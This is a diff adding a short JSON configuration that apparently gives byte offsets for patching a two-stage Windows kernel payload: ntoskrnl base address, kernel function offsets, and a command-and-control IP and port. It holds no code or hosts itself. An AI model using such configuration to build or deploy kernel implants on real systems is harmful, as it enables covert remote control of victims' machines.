@@ -1,0 +1,15 @@
+{
+  "first_stage_default": {
+    "ntoskrnl_base_addr": 13,
+    "hardcoded_function_offsets": {
+      "mm_allocate_contiguous_memory": 27,
+      "mm_map_io_space": 37,
+      "ps_create_system_thread": 47
+    }
+  },
+  "second_stage_default": {
+    "ntoskrnl_base_addr": 21,
+    "c2_ip": 1603,
+    "c2_port": 1594
+  }
+}
